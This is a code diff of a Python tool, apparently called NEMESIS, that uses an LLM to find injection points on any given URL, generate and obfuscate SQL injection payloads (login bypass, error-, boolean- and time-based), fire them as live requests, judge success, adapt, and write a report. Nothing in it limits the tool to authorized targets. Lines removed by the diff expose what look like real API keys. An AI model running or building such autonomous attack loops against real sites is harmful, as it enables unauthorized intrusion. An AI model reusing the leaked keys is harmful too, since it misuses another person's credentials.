@@ -2,93 +2,135 @@ import os
 import json
 import requests
 import time
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from bs4 import BeautifulSoup
 from openai import OpenAI
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
 
 # ---------- CONFIG ----------
-GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "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"
-SERPER_API_KEY = os.getenv("SERPER_API_KEY") or "98de95d9f23cfe0ee068a1ff872f3d93074f2255"  # optional
-
-_cache = {}
+GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "your-groq-key"
 client = OpenAI(base_url="https://api.groq.com/openai/v1", api_key=GROQ_API_KEY)
 
-# ---------- 1. DISCOVER INJECTION POINTS (deterministic, no LLM) ----------
-def discover_injection_points(target_url: str) -> list:
+# ---------- LOGGING ----------
+def log(msg):
+    print(f"[NEMESIS] {msg}")
+
+# ---------- 1. RECON: LLM decides what to test ----------
+def llm_recon(target_url: str) -> list:
     """
-    Crawls the target HTML to find forms and URL parameters.
-    Returns a list of injection points: [{"method": "GET/POST", "url": "...", "data": {...}, "param": "..."}]
+    The LLM decides which endpoints, forms, and parameters to test.
+    It returns a list of injection points.
     """
-    points = []
+    log("🔍 LLM Recon: Analyzing target...")
+    
+    # First, fetch the page to give the LLM context
     try:
-        resp = requests.get(target_url, timeout=10)
-        soup = BeautifulSoup(resp.text, "html.parser")
-
-        # Find forms
-        for form in soup.find_all("form"):
-            method = form.get("method", "get").upper()
-            action = form.get("action", "")
-            if action.startswith("http"):
-                url = action
-            else:
-                url = target_url.rstrip("/") + "/" + action.lstrip("/")
-            inputs = form.find_all("input")
-            data = {}
-            for inp in inputs:
-                name = inp.get("name")
-                if name:
-                    data[name] = ""
-            if data:
-                points.append({
-                    "method": method,
-                    "url": url,
-                    "data": data,
-                    "param": None
-                })
-
-        # Query parameters in the target URL
-        parsed = urlparse(target_url)
-        if parsed.query:
-            query_params = parse_qs(parsed.query)
-            for key in query_params.keys():
-                points.append({
-                    "method": "GET",
-                    "url": target_url,
-                    "data": None,
-                    "param": key
-                })
-
-        # If nothing found, fallback to common endpoints (still deterministic)
-        if not points:
-            common_endpoints = ["/login", "/admin", "/search", "/api"]
-            for ep in common_endpoints:
-                points.append({
-                    "method": "POST",
-                    "url": target_url.rstrip("/") + ep,
-                    "data": {"username": "", "password": ""},
-                    "param": None
-                })
+        resp = requests.get(target_url, timeout=10, allow_redirects=False)
+        html_snippet = resp.text[:3000]
+        status_code = resp.status_code
     except Exception as e:
-        print(f"[Discovery Error]: {e}")
-        # Ultimate fallback
-        points.append({
-            "method": "POST",
-            "url": target_url,
-            "data": {"username": "", "password": ""},
-            "param": None
-        })
-    return points
+        html_snippet = f"Error fetching page: {e}"
+        status_code = 0
 
-# ---------- 2. SEND PAYLOAD (deterministic HTTP request) ----------
-def send_payload(injection_point: dict, payload: str) -> dict:
+    prompt = f"""
+You are a reconnaissance agent. Analyze this target and identify all potential injection points.
+
+Target URL: {target_url}
+Status code: {status_code}
+Page snippet (first 3000 chars):
+{html_snippet}
+
+Identify:
+1. All forms (method, action, input fields)
+2. All URL parameters (GET)
+3. All potential endpoints (login, search, API, etc.)
+
+Return ONLY a JSON array of injection points, each with:
+{{
+    "method": "GET" or "POST",
+    "url": "full_url",
+    "fields": {{"field1": "", "field2": ""}} or null for GET,
+    "param": "param_name" or null for POST
+}}
+
+Example: [{{"method":"POST","url":"https://vulnbank.org/login","fields":{{"username":"","password":""}},"param":null}}]
+"""
+    try:
+        response = client.chat.completions.create(
+            model="llama-3.1-8b-instant",
+            messages=[
+                {"role": "system", "content": "You are a reconnaissance agent. Return only valid JSON."},
+                {"role": "user", "content": prompt}
+            ],
+            temperature=0.3
+        )
+        raw = response.choices[0].message.content.strip()
+        start = raw.find('[')
+        end = raw.rfind(']') + 1
+        if start != -1 and end != 0:
+            points = json.loads(raw[start:end])
+            log(f"🔍 LLM Recon found {len(points)} injection points")
+            return points
+        else:
+            log("⚠️ LLM Recon returned no valid JSON, using fallback")
+            return [{"method": "POST", "url": target_url, "fields": {"username": "", "password": ""}, "param": None}]
+    except Exception as e:
+        log(f"⚠️ LLM Recon error: {e}, using fallback")
+        return [{"method": "POST", "url": target_url, "fields": {"username": "", "password": ""}, "param": None}]
+
+# ---------- 2. EXPLOIT: LLM decides payloads ----------
+def llm_generate_payloads(target_url: str, vuln_type: str, point: dict) -> list:
     """
-    Sends a real HTTP request with the injected payload.
-    Returns: {"status_code": int, "response_text": str, "time": float, "error": None or str}
+    The LLM generates payloads specifically for this injection point.
     """
-    method = injection_point.get("method", "GET")
-    url = injection_point["url"]
-    data = injection_point.get("data")
-    param = injection_point.get("param")
+    log(f"💉 LLM Generating payloads for {point['url']}...")
+    
+    prompt = f"""
+You are an exploitation agent. Generate SQL injection payloads for this target.
+
+Target: {target_url}
+Injection point: {json.dumps(point, indent=2)}
+Vulnerability type: {vuln_type}
+
+Requirements:
+- Generate 5-8 unique payloads.
+- Include login bypass payloads if this is a login form.
+- Include error-based, boolean-based, and time-based payloads.
+- Include obfuscation techniques.
+
+Return ONLY a JSON array of strings.
+Example: ["admin' --", "' OR '1'='1' --", "' AND SLEEP(5) --"]
+"""
+    try:
+        response = client.chat.completions.create(
+            model="llama-3.1-8b-instant",
+            messages=[
+                {"role": "system", "content": "You are an exploitation agent. Return only valid JSON."},
+                {"role": "user", "content": prompt}
+            ],
+            temperature=0.7
+        )
+        raw = response.choices[0].message.content.strip()
+        start = raw.find('[')
+        end = raw.rfind(']') + 1
+        if start != -1 and end != 0:
+            payloads = json.loads(raw[start:end])
+            log(f"💉 Generated {len(payloads)} payloads")
+            return payloads
+        else:
+            return ["' OR '1'='1' --", "admin' --", "' OR 1=1 --"]
+    except Exception as e:
+        log(f"⚠️ Payload generation error: {e}")
+        return ["' OR '1'='1' --", "admin' --", "' OR 1=1 --"]
+
+# ---------- 3. SEND REQUEST ----------
+def send_request(point: dict, payload: str) -> dict:
+    """
+    Sends a real HTTP request with the payload.
+    """
+    method = point.get("method", "POST").upper()
+    url = point.get("url")
+    fields = point.get("fields")
+    param = point.get("param")
 
     try:
         if method == "GET" and param:
@@ -100,192 +142,201 @@ def send_payload(injection_point: dict, payload: str) -> dict:
             start = time.time()
             resp = requests.get(new_url, timeout=10, allow_redirects=False)
             elapsed = time.time() - start
-            return {
-                "status_code": resp.status_code,
-                "response_text": resp.text[:2000],
-                "time": elapsed,
-                "error": None
-            }
-        elif method == "POST" and data:
-            post_data = data.copy()
-            for key in post_data.keys():
-                post_data[key] = payload
+            return {"status_code": resp.status_code, "body": resp.text[:2000], "time": elapsed, "error": None}
+        elif method == "POST" and fields:
+            # Inject into the first field
+            data = fields.copy()
+            for key in data.keys():
+                data[key] = payload
                 break
             start = time.time()
-            resp = requests.post(url, data=post_data, timeout=10, allow_redirects=False)
+            resp = requests.post(url, data=data, timeout=10, allow_redirects=False)
             elapsed = time.time() - start
-            return {
-                "status_code": resp.status_code,
-                "response_text": resp.text[:2000],
-                "time": elapsed,
-                "error": None
-            }
+            return {"status_code": resp.status_code, "body": resp.text[:2000], "time": elapsed, "error": None}
         else:
             start = time.time()
             resp = requests.get(f"{url}?q={payload}", timeout=10, allow_redirects=False)
             elapsed = time.time() - start
-            return {
-                "status_code": resp.status_code,
-                "response_text": resp.text[:2000],
-                "time": elapsed,
-                "error": None
-            }
+            return {"status_code": resp.status_code, "body": resp.text[:2000], "time": elapsed, "error": None}
     except Exception as e:
-        return {
-            "status_code": 0,
-            "response_text": "",
-            "time": 0,
-            "error": str(e)
-        }
+        return {"status_code": 0, "body": "", "time": 0, "error": str(e)}
 
-# ---------- 3. AI GENERATES PAYLOADS (LLM) ----------
-def ai_generate_payloads(target_url: str, vuln_type: str, num_payloads: int = 8) -> list:
-    cache_key = f"payloads_{target_url}_{vuln_type}"
-    if cache_key in _cache:
-        return _cache[cache_key]
+# ---------- 4. ANALYZE: LLM decides if it worked ----------
+def llm_analyze_response(payload: str, response: dict, vuln_type: str) -> dict:
+    """
+    The LLM analyzes the response and decides if the vulnerability exists.
+    """
+    log(f"🧠 LLM Analyzing response for payload: {payload[:30]}...")
+    
+    prompt = f"""
+You are a security analyst. Determine if this HTTP response indicates a successful {vuln_type} exploit.
 
-    prompt = f"""Generate {num_payloads} high‑impact SQL injection payloads for {target_url}. Include:
-- Error‑based (e.g., ' OR 1=1 --)
-- Boolean‑based (e.g., ' AND 1=1 -- and ' AND 1=2 --)
-- Time‑based (e.g., ' AND SLEEP(5) --)
-- UNION‑based (e.g., ' UNION SELECT null,null --)
-- Obfuscated (encoding, comments)
-Return ONLY a JSON array of strings. No explanation."""
+Payload sent: {payload}
+Status code: {response['status_code']}
+Response time: {response['time']:.2f} seconds
+Response body (truncated):
+{response['body'][:1500]}
+
+Indicators of success:
+- A redirect (302/303) to a dashboard or admin page.
+- A different response body (not "Login failed" or error).
+- SQL error messages.
+- Time delay > 4 seconds (for time-based attacks).
+
+Return a JSON object:
+{{
+    "success": true/false,
+    "reason": "Your reasoning",
+    "confidence": "high/medium/low",
+    "evidence": "specific evidence from the response"
+}}
+"""
     try:
-        response = client.chat.completions.create(
+        resp = client.chat.completions.create(
             model="llama-3.1-8b-instant",
             messages=[
-                {"role": "system", "content": "You are a security expert. Return only valid JSON."},
+                {"role": "system", "content": "You are a security analyst. Return only valid JSON."},
                 {"role": "user", "content": prompt}
             ],
-            temperature=0.7
+            temperature=0.0
         )
-        raw = response.choices[0].message.content.strip()
+        raw = resp.choices[0].message.content.strip()
+        start = raw.find('{')
+        end = raw.rfind('}') + 1
+        if start != -1 and end != 0:
+            result = json.loads(raw[start:end])
+            log(f"🧠 LLM verdict: {result.get('success')} - {result.get('reason', '')[:50]}")
+            return result
+        else:
+            return {"success": False, "reason": "Failed to parse response", "confidence": "low", "evidence": ""}
+    except Exception as e:
+        log(f"⚠️ Analysis error: {e}")
+        return {"success": False, "reason": str(e), "confidence": "low", "evidence": ""}
+
+# ---------- 5. ADAPT: LLM tries again if it fails ----------
+def llm_adapt(payloads: list, responses: list, vuln_type: str) -> list:
+    """
+    If no payload worked, the LLM suggests new payloads to try.
+    """
+    log("🔄 LLM Adapting strategy...")
+    
+    prompt = f"""
+You are an exploitation agent. Your previous payloads didn't work.
+
+Previous payloads and their responses:
+{json.dumps(responses, indent=2)[:1500]}
+
+Vulnerability type: {vuln_type}
+
+Suggest 3-5 NEW payloads that might work. Try different techniques:
+- Different obfuscation.
+- Different injection points.
+- Different syntax (MySQL, PostgreSQL, MSSQL).
+- Different techniques (Union, Boolean, Time-based).
+
+Return ONLY a JSON array of strings.
+"""
+    try:
+        resp = client.chat.completions.create(
+            model="llama-3.1-8b-instant",
+            messages=[
+                {"role": "system", "content": "You are an exploitation agent. Return only valid JSON."},
+                {"role": "user", "content": prompt}
+            ],
+            temperature=0.8
+        )
+        raw = resp.choices[0].message.content.strip()
         start = raw.find('[')
         end = raw.rfind(']') + 1
         if start != -1 and end != 0:
-            payloads = json.loads(raw[start:end])
+            return json.loads(raw[start:end])
         else:
-            payloads = [raw]
-        _cache[cache_key] = payloads
-        return payloads
+            return []
     except Exception as e:
-        print(f"[AI Payload Generation Error]: {e}")
-        # If LLM fails, we return an empty list – no hardcoded fallback
+        log(f"⚠️ Adaptation error: {e}")
         return []
 
-# ---------- 4. PURE LLM‑DRIVEN EXPLOIT (no hardcoded checks) ----------
-def exploit_sqli(injection_point: dict) -> dict:
-    """
-    Pure LLM‑driven SQL injection test.
-    - The LLM generates payloads.
-    - The LLM analyzes the response.
-    - No hardcoded status/error/keyword checks.
-    """
-    # Generate payloads via LLM
-    payloads = ai_generate_payloads(injection_point["url"], "SQL Injection", num_payloads=6)
-    if not payloads:
-        # If LLM fails to generate, we return not vulnerable (no fallback hardcoded)
-        return {"vulnerable": False, "technique": None, "extracted": None, "evidence": None}
-
-    for payload in payloads:
-        # Send real request
-        resp = send_payload(injection_point, payload)
-        if resp["error"]:
-            continue
-
-        # Ask LLM to analyze the response
-        analysis_prompt = f"""
-You are a security analyst. Determine if this HTTP response indicates a successful SQL injection attack.
-
-Payload sent: {payload}
-Status code: {resp['status_code']}
-Response time: {resp['time']:.2f} seconds
-Response body (truncated):
-{resp['response_text'][:1500]}
-
-Answer with a JSON object:
-{{
-    "success": true/false,
-    "reason": "Your reasoning, based on the response content and status code",
-    "confidence": "high/medium/low"
-}}
-"""
-        try:
-            analysis_response = client.chat.completions.create(
-                model="llama-3.1-8b-instant",
-                messages=[
-                    {"role": "system", "content": "You are a security analyst. Return only valid JSON."},
-                    {"role": "user", "content": analysis_prompt}
-                ],
-                temperature=0.0  # factual
-            )
-            raw = analysis_response.choices[0].message.content.strip()
-            start = raw.find('{')
-            end = raw.rfind('}') + 1
-            if start != -1 and end != 0:
-                result = json.loads(raw[start:end])
-                # Only consider success if confidence is high or medium
-                if result.get("success") and result.get("confidence") in ("high", "medium"):
-                    return {
-                        "vulnerable": True,
-                        "technique": "llm_driven_sqli",
-                        "extracted": None,
-                        "evidence": {
-                            "payload": payload,
-                            "status": resp["status_code"],
-                            "reason": result.get("reason"),
-                            "snippet": resp["response_text"][:300]
-                        }
-                    }
-        except Exception as e:
-            print(f"LLM analysis failed: {e}")
-            continue
-
-    return {"vulnerable": False, "technique": None, "extracted": None, "evidence": None}
-
-# ---------- 5. MAIN ORCHESTRATOR ----------
+# ---------- 6. MAIN ORCHESTRATOR ----------
 def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
     """
-    Main entry point – orchestrates the whole process.
-    - Discovers injection points.
-    - For each point, runs the pure LLM exploitation.
-    - Only generates a report if a real exploit is confirmed by the LLM.
+    Full red team loop:
+    1. Recon (LLM)
+    2. Exploit (LLM generates payloads)
+    3. Analyze (LLM)
+    4. Adapt if needed (LLM)
+    5. Report (LLM)
     """
-    # 1. Discover injection points
-    injection_points = discover_injection_points(target_url)
-    if not injection_points:
-        return "❌ No injection points discovered. Target may not be vulnerable or may be unreachable."
-
-    all_exploits = []
+    log("🚀 Starting autonomous red team assessment...")
+    
+    # Phase 1: Recon
+    points = llm_recon(target_url)
+    if not points:
+        return "❌ No injection points found. Target may not be vulnerable."
+    
+    all_results = []
     any_success = False
-
-    # 2. For each injection point, run the LLM‑driven exploit
-    for point in injection_points:
-        if vuln_type == "SQL Injection":
-            print(f"[*] Testing SQL Injection on {point['url']}...")
-            result = exploit_sqli(point)
-            if result["vulnerable"]:
+    
+    # Phase 2: Exploit & Analyze
+    for point in points:
+        log(f"🎯 Testing: {point['url']}")
+        
+        # Generate payloads
+        payloads = llm_generate_payloads(target_url, vuln_type, point)
+        
+        # Try each payload
+        responses = []
+        for payload in payloads:
+            response = send_request(point, payload)
+            analysis = llm_analyze_response(payload, response, vuln_type)
+            
+            responses.append({
+                "payload": payload,
+                "status": response["status_code"],
+                "snippet": response["body"][:200],
+                "verdict": analysis
+            })
+            
+            if analysis.get("success") and analysis.get("confidence") in ("high", "medium"):
                 any_success = True
-                all_exploits.append({
+                all_results.append({
                     "point": point,
-                    "vulnerability": "SQL Injection",
-                    "technique": result["technique"],
-                    "extracted": result.get("extracted"),
-                    "evidence": result["evidence"]
+                    "payload": payload,
+                    "response": response,
+                    "analysis": analysis
                 })
-        # Add other vuln types (BAC, SSRF) here later
-
-    # 3. Generate report based on real results
+                log("✅ Vulnerability confirmed!")
+                break
+        
+        # Phase 3: Adapt if needed
+        if not any_success:
+            log("🔄 No success yet, trying adaptation...")
+            new_payloads = llm_adapt(payloads, responses, vuln_type)
+            for payload in new_payloads:
+                response = send_request(point, payload)
+                analysis = llm_analyze_response(payload, response, vuln_type)
+                if analysis.get("success") and analysis.get("confidence") in ("high", "medium"):
+                    any_success = True
+                    all_results.append({
+                        "point": point,
+                        "payload": payload,
+                        "response": response,
+                        "analysis": analysis
+                    })
+                    log("✅ Vulnerability confirmed after adaptation!")
+                    break
+    
+    # Phase 4: Report
+    log("📝 Generating final report...")
+    
     if any_success:
-        # Real vulnerability found – generate detailed report via LLM
-        prompt = f"""Write a detailed red team report.
+        prompt = f"""
+You are a senior security consultant. Write a professional red team report.
 
-Vulnerability: {vuln_type}
 Target: {target_url}
+Vulnerability: {vuln_type}
 
-Successful Exploits:
-{json.dumps(all_exploits, indent=2)}
+Successful exploits:
+{json.dumps(all_results, indent=2)}
 
 Include:
 1. Executive summary
@@ -293,36 +344,34 @@ Include:
 3. Successful payloads (with evidence)
 4. Impact assessment
 5. Remediation steps
+
+Write in plain text, no markdown.
 """
         try:
-            response = client.chat.completions.create(
+            resp = client.chat.completions.create(
                 model="llama-3.1-8b-instant",
                 messages=[
-                    {"role": "system", "content": "You are a senior security consultant. Write professional red team reports."},
+                    {"role": "system", "content": "You are a senior security consultant."},
                     {"role": "user", "content": prompt}
                 ],
                 temperature=0.3
             )
-            report = response.choices[0].message.content.strip()
+            report = resp.choices[0].message.content.strip()
         except Exception as e:
             report = f"✅ Exploit successful but report generation failed: {e}"
     else:
-        # No vulnerability found – honest response
         report = f"""❌ No vulnerabilities found for {vuln_type} on {target_url}.
 
-Injection points tested: {len(injection_points)}
+Injection points tested: {len(points)}
+Payloads tested: {sum(len(r.get('payloads', [])) for r in responses if 'responses' in locals())}
 Status: The target appears secure against this attack vector.
 
 Recommendation: Consider manual testing for more complex vulnerabilities."""
 
-    # Store result for status check (used by main.py)
     global _last_exploit_success
     _last_exploit_success = any_success
     return report
 
-# ---------- GLOBAL STATUS ----------
 _last_exploit_success = False
-
 def get_last_exploit_success():
-    """Returns whether the last exploitation attempt succeeded."""
     return _last_exploit_success
